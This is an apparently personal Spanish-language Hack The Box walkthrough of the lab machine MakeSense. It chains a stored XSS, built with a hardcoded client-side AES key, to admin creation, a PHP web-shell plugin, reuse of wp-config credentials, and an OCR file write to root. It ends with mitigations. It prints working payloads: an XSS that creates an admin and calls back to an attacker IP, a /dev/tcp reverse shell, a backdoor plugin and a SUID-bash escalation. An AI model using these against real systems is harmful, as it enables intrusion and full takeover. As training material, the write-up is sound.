---
title: "HTB Walkthrough: MakeSense"
date: 2026-07-06
draft: false
description: "Walkthrough completo de la máquina MakeSense de Hack The Box. Dificultad Media, Linux. Stored XSS en tema WordPress personalizado mediante bypass de cifrado AES-256-GCM hardcodeado en cliente → CSRF vía XSS para crear usuario administrador → subida de plugin malicioso (RCE como www-data) → reutilización de credenciales en wp-config.php → SSH como walter → escritura arbitraria de fichero PHP en servicio OCR local ejecutado como root → RCE como root."
tags: ["HackTheBox", "Linux", "Medium", "WordPress", "XSS", "StoredXSS", "CSRF", "AES", "HardcodedKey", "OCR", "FileWrite", "RCE", "PrivilegeEscalation", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **MakeSense** en Hack The Box. Máquina de dificultad **Media** con **Linux**. El puerto 443 sirve un **WordPress 7.0** con un tema personalizado (`webagency`) que expone una **clave AES-256-GCM hardcodeada en el JavaScript del cliente**. Esto permite cifrar un payload XSS arbitrario y enviarlo directamente al backend, que lo descifra y almacena sin sanear — **Stored XSS**. Cuando el bot/admin visita el panel, el JavaScript inyectado extrae el nonce de CSRF de `user-new.php` y crea un usuario con rol `administrator`. Desde la cuenta de admin, se sube un **plugin malicioso** con backdoor PHP para obtener shell como `www-data`. Las credenciales de la base de datos en `wp-config.php` están reutilizadas para el sistema: SSH como `walter`. Finalmente, un servicio **OCR** local (puerto 8001) ejecutado por una tarea de **cron como root** guarda el texto reconocido en un fichero con extensión controlada por el usuario — lo que permite escribir un fichero `.php` con código arbitrario y obtener **RCE como root**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                                                                       |
|----------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | MakeSense                                                                                                                                                                                     |
| **SO**         | Linux (Ubuntu 24.04.4 LTS)                                                                                                                                                                    |
| **Dificultad** | Media                                                                                                                                                                                         |
| **IP**         | 10.129.26.162                                                                                                                                                                                 |
| **Técnicas**   | Hardcoded AES key bypass · Stored XSS en AJAX personalizado · CSRF vía XSS (creación de admin) · Plugin malicioso WordPress · Reutilización de credenciales wp-config.php · OCR file write → RCE root |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.26.162
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
```

### 1.2 Enumeración Web — WordPress con WPScan

```bash
echo "10.129.26.162 makesense.htb" >> /etc/hosts
wpscan --url https://10.129.26.162/ --disable-tls-checks -e u,ap,at,tt,cb,dbe
```

```
[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).

[+] webagency
| Location: https://10.129.26.162/wp-content/themes/webagency/
| [!] Directory listing is enabled
| Style Name: WebAgency
| Description: Modern web development agency theme with Tailwind CSS...
| Version: 1.0 (80% confidence)

[+] XML-RPC seems to be enabled: https://10.129.26.162/xmlrpc.php
[+] Upload directory has listing enabled: https://10.129.26.162/wp-content/uploads/

[+] Users: admin, walter, jake
```

> **💡 Superficie de ataque:** dos servicios — SSH y HTTPS con WordPress. El tema `webagency` es un desarrollo **a medida** (no es oficial), lo que lo convierte en el vector más prometedor. El directory listing en `/wp-content/themes/webagency/` permite examinar directamente sus recursos estáticos (JS/CSS).

---

## 2. Análisis del Tema Personalizado `webagency`

Inspeccionando los ficheros JavaScript del tema, se identifican varias acciones AJAX registradas en `admin-ajax.php`:

```
submit_contact_form
save_voice_raw
save_voice_results
```

Dentro del mismo JavaScript del cliente aparece una **clave de cifrado hardcodeada**:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

El código cifra en el navegador (AES-256-GCM) los datos enviados al backend mediante `save_voice_results` (`post_id` + `encrypted_payload`). También existe una función `applySymbolMapping(text)` que pretende sanear símbolos problemáticos — pero que solo se aplica dentro del flujo legítimo, antes del cifrado.

> **⚠️ Versión vulnerable:** El saneamiento de entrada (`applySymbolMapping`) opera en el cliente y solo se ejecuta en el flujo legítimo "voz → transcripción → cifrado". Al ser la clave hardcodeada y pública, un atacante puede cifrar cualquier payload arbitrario localmente **sin pasar por ese saneamiento**, enviarlo directamente a `save_voice_results` y lograr que el backend lo descifre y almacene tal cual — rompiendo por completo el modelo de seguridad.

---

## 3. Explotación — Stored XSS mediante Bypass del Payload Cifrado

### 3.1 Extracción del Nonce de WordPress

```bash
NONCE=$(curl -ks https://10.129.26.162/ | grep -oP '"nonce":"\K[^"]+')
echo $NONCE
```

```
f3142630f4
```

### 3.2 Crear un Contacto para Obtener un `post_id` Válido

```bash
curl -ks -X POST "https://10.129.26.162/wp-admin/admin-ajax.php" \
  -H "Referer: https://10.129.26.162/" \
  -d "action=submit_contact_form" \
  -d "nonce=$NONCE" \
  -d "name=test" \
  -d "email=test@test.com" \
  -d "phone=123456" \
  -d "message=hello this is a test message long enough to trigger processing"
```

```json
{"success":true,"data":{"message":"Thank you for contacting us! We will get back to you soon.","post_id":69}}
```

### 3.3 Construir el Payload Cifrado con la Clave Hardcodeada

```bash
PAYLOAD=$(node -e "
const crypto = require('crypto');
const key    = crypto.createHash('sha256').update('bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const p      = JSON.stringify({
  transcription: '<img src=x onerror=alert(document.domain)>',
  summary:       '<img src=x onerror=alert(document.domain)>'
});
const enc = Buffer.concat([cipher.update(p,'utf8'), cipher.final()]);
const tag = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString('base64'));
")
```

### 3.4 Enviar el Payload Cifrado como Resultado de Voz

```bash
curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=f3142630f4" \
  -F "post_id=69" \
  -F "encrypted_payload=$PAYLOAD"
```

```json
{"success":true,"data":{"message":"Results saved successfully!","post_id":69}}
```

### 3.5 Confirmar el Stored XSS con Callback

```bash
export IP=10.10.14.211
python3 -m http.server 8000 &

POST_ID=71

PAYLOAD=$(node -e "
const crypto = require('crypto');
const key    = crypto.createHash('sha256').update('bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const ip     = process.env.IP;
const x      = '<img src=x onerror=\"this.onerror=null;this.src=\\x27http://'+ip+':8000/ping\\x27\">';
const p      = JSON.stringify({transcription: x, summary: x});
const enc    = Buffer.concat([cipher.update(p,'utf8'), cipher.final()]);
const tag    = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString('base64'));
")

curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=f3142630f4" \
  -F "post_id=$POST_ID" \
  -F "encrypted_payload=$PAYLOAD"
```

```
10.129.26.162 - - [06/Jul/2026 20:11:30] "GET /ping HTTP/1.1" 404 -
```

```
Flujo normal:    voz → transcripción → applySymbolMapping → AES-GCM cifrado → save_voice_results → servidor descifra + sanitiza → almacena
Flujo malicioso: atacante cifra payload propio con clave pública → save_voice_results → servidor descifra sin sanear
                 → <img onerror=...> almacenado → admin visita panel → XSS ejecuta en sesión de admin
```

> **💡 Hallazgo clave:** el callback confirma que un usuario con sesión de administrador ejecutó el JavaScript inyectado. El código `404` no importa — solo importa que la petición llegó desde el contexto autenticado de la víctima.

---

## 4. CSRF vía XSS — Creación de Usuario Administrador

Con el Stored XSS confirmado, se usa la sesión autenticada de la víctima para **crear un usuario administrador** extrayendo dinámicamente el nonce de CSRF del propio DOM.

```bash
PAYLOAD=$(node -e '
const crypto = require("crypto");
const key    = crypto.createHash("sha256").update("bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI").digest();
const iv     = crypto.randomBytes(12);
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
const ip     = process.env.IP;

const js = `
fetch("/wp-admin/user-new.php", {credentials:"include"})
.then(r => r.text())
.then(t => {
  const d = new DOMParser().parseFromString(t, "text/html");
  const n = d.querySelector("input[name=_wpnonce_create-user]")?.value;
  if (!n) { throw new Error("nonce_not_found"); }
  const f = new FormData();
  f.append("action",               "createuser");
  f.append("_wpnonce_create-user", n);
  f.append("_wp_http_referer",     "/wp-admin/user-new.php");
  f.append("user_login",           "codexadmin");
  f.append("email",                "codexadmin@test.htb");
  f.append("first_name",           "codex");
  f.append("last_name",            "admin");
  f.append("pass1",                "Password123!@#");
  f.append("pass2",                "Password123!@#");
  f.append("role",                 "administrator");
  f.append("createuser",           "Add New User");
  return fetch("/wp-admin/user-new.php", {method:"POST", credentials:"include", body:f});
})
.then(r  => { new Image().src = "http://${ip}:8000/done?status=" + r.status; })
.catch(e => { new Image().src = "http://${ip}:8000/err?e=" + encodeURIComponent(e.message); });
`;

const x   = `<img src=x onerror="${js.replaceAll("\"","&quot;")}">`;
const p   = JSON.stringify({transcription: x, summary: x});
const enc = Buffer.concat([cipher.update(p, "utf8"), cipher.final()]);
const tag = cipher.getAuthTag();
process.stdout.write(Buffer.concat([iv, enc, tag]).toString("base64"));
')

curl -ks -X POST "https://makesense.htb/wp-admin/admin-ajax.php" \
  -F "action=save_voice_results" \
  -F "nonce=$NONCE" \
  -F "post_id=$POST_ID" \
  -F "encrypted_payload=$PAYLOAD"
```

```
10.129.26.162 - - [06/Jul/2026 20:14:33] "GET /done?status=200 HTTP/1.1" 404 -
```

> **🔑 Credenciales obtenidas:** `codexadmin : Password123!@#` con rol `administrator`. El `status=200` confirma la creación exitosa del usuario.

---

## 5. RCE como `www-data` — Plugin Malicioso de WordPress

Con acceso de administrador confirmado en `https://makesense.htb/wp-login.php`, se abusa de la capacidad de instalar plugins.

### 5.1 Crear el Plugin Malicioso

```bash
mkdir shellplugin
cat > shellplugin/shellplugin.php <<'PHP'
<?php
/*
Plugin Name: Shell Plugin
*/
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
PHP
zip -r shellplugin.zip shellplugin
```

**Subida:** `Plugins → Add New → Upload Plugin → shellplugin.zip → Activate`

### 5.2 Verificación de RCE y Reverse Shell

```bash
curl -ks "https://makesense.htb/wp-content/plugins/shellplugin/shellplugin.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
nc -lvnp 4444
```

```bash
curl -ks "https://makesense.htb/wp-content/plugins/shellplugin/shellplugin.php?cmd=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.211/4444+0>%261'"
```

```
Connection received on 10.129.26.162 49302
www-data@makesense:/var/www/html/wp-content/plugins/shellplugin$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

```
Flujo normal:    admin instala plugin desde wordpress.org (código revisado) → funcionalidad legítima
Flujo malicioso: acceso admin vía CSRF/XSS → subida de plugin con backdoor PHP → GET ?cmd=id → RCE como www-data
```

---

## 6. Movimiento Lateral — Credenciales Reutilizadas en `wp-config.php`

```bash
grep DB_ /var/www/html/wp-config.php
```

```
define( 'DB_USER',     'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

> **💡 Hallazgo clave:** las credenciales de base de datos (`walter` / `JbhHDAEgXvri3!`) están **reutilizadas** como credenciales del sistema para el usuario `walter`.

```bash
ssh walter@makesense.htb
```

```
walter@makesense:~$
```

---

## 7. User Flag

```bash
cat /home/walter/user.txt
```

> 🔑 User flag obtenida.

---

## 8. Enumeración de Privilegios — Servicio OCR Local

```bash
ss -tulpen | grep 8001
```

```
tcp   LISTEN 0  4096  127.0.0.1:8001  0.0.0.0:*  ino:11956 sk:8 cgroup:/system.slice/cron.service <->
```

> **⚠️ Exposición crítica:** hay un servicio HTTP escuchando solo en `127.0.0.1:8001`, dentro del cgroup `cron.service` — es decir, lanzado por una **tarea de cron ejecutada como root**.

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/ | grep -i title
```

```html
<title>MakeSense</title>
```

El servicio acepta las mismas credenciales de `walter` y es una herramienta interna de **OCR**: permite subir una imagen, extraer el texto que contiene, y guardar ese texto en un fichero dentro de `saved/`.

---

## 9. Escalada de Privilegios — Escritura Arbitraria de Fichero PHP en Servicio OCR (RCE como root)

El flujo del servicio OCR expone dos operaciones:

1. `POST /` con `canvas_image` (data URI): extrae el texto de la imagen mediante OCR, devuelve un `ocr_id`.
2. `POST /` con `ocr_id`, `filename` y `save_output=Save`: escribe el texto extraído en `saved/<filename>` **sin validar extensión ni contenido**.

> **⚠️ Fallo de diseño:** el texto que el OCR "reconoce" es el que aparece en la imagen que nosotros mismos generamos — controlamos completamente el **contenido**. Y como `filename` no se restringe, controlamos también la **extensión**. Esto permite escribir un fichero `.php` con código arbitrario en el webroot del servicio. Al solicitarlo después vía HTTP, el intérprete PHP lo ejecuta con los privilegios del proceso — **root**.

### 9.1 Generar una Imagen con Payload PHP

```python
from PIL import Image, ImageDraw, ImageFont
import base64

text      = "<?php system('chmod +s /bin/bash'); ?>"
font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
font      = ImageFont.truetype(font_path, 64)

tmp = Image.new("RGB", (10, 10), "white")
bb  = ImageDraw.Draw(tmp).textbbox((0, 0), text, font=font)

img = Image.new("RGB", (bb[2]-bb[0]+80, bb[3]-bb[1]+80), "white")
ImageDraw.Draw(img).text((40-bb[0], 40-bb[1]), text, fill="black", font=font)
img.save("/tmp/mk_suid.png")

with open("/tmp/mk_suid.png", "rb") as f:
    b64 = base64.b64encode(f.read()).decode()
with open("/tmp/mk_du.txt", "w") as f:
    f.write("data:image/png;base64," + b64)
```

La imagen muestra, en texto grande y nítido (fuente monoespaciada), la cadena `<?php system('chmod +s /bin/bash'); ?>` para que el motor OCR la reconozca sin errores.

### 9.2 Subir la Imagen al Servicio OCR

```bash
B=http://127.0.0.1:8001
A='walter:JbhHDAEgXvri3!'
J=/tmp/mk_cj

curl -s -u "$A" -c "$J" -b "$J" "$B/" \
  --data-urlencode 'canvas_image@/tmp/mk_du.txt' \
  -o /tmp/mk_o1

OCRID=$(grep -oP 'name="ocr_id" value="\K[^"]+' /tmp/mk_o1)
echo $OCRID
```

```
ocr_6a4bf97d330ef1.66612266
```

### 9.3 Guardar el Texto Reconocido como `pwn.php`

```bash
curl -s -u "$A" -c "$J" -b "$J" "$B/" \
  --data-urlencode "ocr_id=$OCRID" \
  --data-urlencode 'filename=pwn.php' \
  --data-urlencode 'save_output=Save' \
  -o /tmp/mk_o2
```

### 9.4 Ejecutar el Payload

```bash
curl -s -u "$A" "$B/saved/pwn.php"
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

```bash
/bin/bash -p
bash-5.2# id
uid=1000(walter) gid=1000(walter) euid=0(root) egid=0(root) groups=0(root),1000(walter)
```

```
Flujo normal:    imagen → OCR extrae texto → save_output guarda como .txt en saved/ → usuario lee texto
Flujo malicioso: imagen con <?php system(...) ?> → OCR "lee" código PHP → save como pwn.php (sin validación)
                 → GET /saved/pwn.php → PHP ejecuta como root → chmod +s /bin/bash → /bin/bash -p → EUID 0
```

---

## 10. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 11. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela SSH y HTTPS. WPScan identifica WordPress 7.0 con tema personalizado `webagency` y usuarios `admin`, `walter`, `jake`.
2. **Análisis del tema** → JavaScript del cliente expone la clave AES-256-GCM hardcodeada `bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI` y la acción AJAX `save_voice_results`.
3. **Stored XSS** → Se cifra localmente un payload XSS con la clave pública y se envía a `save_voice_results`. El backend descifra sin sanear y almacena el HTML malicioso.
4. **CSRF vía XSS** → El JavaScript inyectado extrae dinámicamente el nonce de `user-new.php` y crea el usuario `codexadmin` con rol `administrator`.
5. **RCE como www-data** → Subida de plugin malicioso → backdoor PHP → reverse shell como `www-data`.
6. **Movimiento lateral** → `wp-config.php` expone `walter:JbhHDAEgXvri3!`, reutilizadas como credenciales del sistema → SSH como `walter`.
7. **User flag** → `/home/walter/user.txt`.
8. **OCR service** → Puerto 8001 local, en cgroup de cron de root, escribe ficheros con extensión controlada por el usuario sin validación.
9. **Escalada de privilegios** → Imagen con payload PHP → OCR extrae el texto → guardado como `pwn.php` → ejecución PHP como root → `chmod +s /bin/bash` → `/bin/bash -p` → EUID 0.
10. **Root flag** → `/root/root.txt`.

**Qué aprendí de esta máquina:**

- **Una clave de cifrado hardcodeada en el JavaScript del cliente no protege nada.** El propósito del "cifrado" era evitar que el saneamiento cliente fuera bypassado — pero la clave visible en el código fuente hace exactamente lo contrario: permite a cualquier atacante cifrar el payload que elija, saltándose el saneamiento sin que el servidor lo detecte. El saneamiento de entrada siempre debe ocurrir en el servidor, independientemente del mecanismo de transporte.

- **Un Stored XSS en el panel de administración equivale a CSRF total.** El XSS permite ejecutar JavaScript en el contexto autenticado de cualquier usuario que visite el panel. Los nonces de CSRF de WordPress protegen contra peticiones forjadas desde otros orígenes, pero no contra código JavaScript que ya se ejecuta en el mismo origen. La causa raíz es siempre el XSS — solucionado el XSS, el nonce vuelve a ser una defensa efectiva.

- **La instalación de plugins en WordPress es ejecución de código.** Cualquier usuario con rol `administrator` puede subir y activar un plugin con código PHP arbitrario. En entornos donde no se necesita instalar plugins de forma regular, `DISALLOW_FILE_MODS` en `wp-config.php` elimina completamente este vector. Las credenciales de administrador deben protegerse como si fueran acceso SSH al servidor.

- **Las credenciales de base de datos en `wp-config.php` son credenciales del servidor si se reutilizan.** La contraseña de `walter` aparecía en un fichero legible por `www-data` — el usuario de la aplicación. Una vez obtenida shell como `www-data`, la escalada a `walter` fue trivial. Las credenciales de servicios deben ser únicas y nunca compartidas con cuentas del sistema operativo.

- **Un servicio que escribe ficheros con extensión controlada por el usuario en el webroot es equivalente a RCE.** El servicio OCR no validaba la extensión del fichero de salida. Independientemente de que el contenido venga de un motor OCR, un atacante que controla qué aparece en la imagen también controla el texto que se escribe. La escritura de ficheros en directorios servidos por un intérprete (PHP, Python WSGI, etc.) debe validar extensión y contenido rigurosamente.

- **Los servicios locales con privilegios elevados son la superficie de escalada más común.** El servicio OCR corría como root a través de cron. El hecho de estar enlazado a `127.0.0.1` lo protegía de acceso externo, pero cualquier usuario con shell en la misma máquina podía interactuar con él. El principio de mínimo privilegio dictaría que el servicio OCR corriera con un usuario dedicado sin privilegios.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Clave AES-256-GCM hardcodeada en JavaScript del cliente | No delegar el saneamiento de entrada en el mecanismo de cifrado; validar y sanear siempre en el servidor |
| Stored XSS en `transcription` / `summary` | Escapar HTML en cualquier campo generado por el usuario antes de renderizarlo; aplicar Content-Security-Policy estricta |
| CSRF vía XSS (creación de usuario admin) | Eliminar el XSS es la causa raíz; añadir cabeceras `SameSite=Strict` como defensa en profundidad |
| Plugin malicioso subido por administrador | Usar `DISALLOW_FILE_MODS = true` en `wp-config.php`; restringir instalación de plugins a orígenes de confianza |
| Reutilización de credenciales DB / sistema (`wp-config.php`) | Usar credenciales distintas y aleatorias para cada servicio; rotar tras cualquier exposición |
| Servicio OCR escribe ficheros con extensión controlable por el usuario | Forzar lista blanca de extensiones permitidas (`.txt`); nunca servir ficheros generados por OCR desde un directorio con intérprete PHP activo |
| Servicio OCR ejecutado como root vía cron | Ejecutar con usuario dedicado sin privilegios; aislar con `systemd` hardening (`User=`, `NoNewPrivileges`, `ProtectSystem`) |
